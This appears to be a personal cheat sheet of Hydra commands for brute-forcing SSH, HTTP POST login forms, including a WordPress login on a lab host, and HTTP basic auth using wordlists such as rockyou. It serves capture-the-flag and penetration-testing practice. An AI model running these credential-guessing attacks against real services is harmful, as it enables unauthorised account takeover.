### Bruteforce SSH Connection with Wordlist as Passwordfile
```
hydra -l alex -P /usr/share/wordlists/rockyou.txt ssh://10.10.158.225
```
if you need a specific port(ex ssh is on custom port 2222)
```
hydra -l alex -P /usr/share/wordlists/rockyou.txt ssh://10.10.158.225:<port>
```

### Bruteforce Post web form 
(/login reflects how is the URL of the login page)
```
hydra -l <user> -P <wordlist> <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V 
```
or by response size with **:S=302**

Example:
```
POST /wp-login.php HTTP/1.1
Host: mrrobot.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Origin: http://mrrobot.thm

Referer: http://mrrobot.thm/wp-login

Sec-GPC: 1

log=&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1
```

COMMANDO will be:
```
hydra -l <user> -P <wordlist> <IP> http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"
```


### Bruteforce HTTP website with GET basic Auth
```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s 8080 -f <target> http-get /xxxx
-s: sets the port
-f: tells to hydra to stop when a result is found
http-get: tells to use http-get as Requests form
/xxxx: tells the specific path to login page
```


### Http POST form structure
```
/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string]
Where the fail/success string is:

Type 	    Boolean     Value 	        Flag
Fail 	    FALSE       F=html_content
Success 	TRUE 	    S=html_content
```

How to find the right String so we don't get false positives?
1)Sometimes by trying with wrong credentials website will give you a error string like "User not available etc"
2)Check in the HTML and find a string that is not going to be available in after the login
```
Ex: if in source we have this:  <form name='login' autocomplete='off' class='form' action='' method='post'>
```
We can use that as fail because most probably it won't be available after login
```
((  F=<form name='login'  ))
```


### Bruteforce HTTP Basic Auth
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -u -f 138.68.166.146 -s 30700 http-get /
```
(The word-list used have some default credentials and is in username:password format)
```
-f= closes hydra att success
-u= loop around on usernames instead on the password(use one user on all passwords)
```
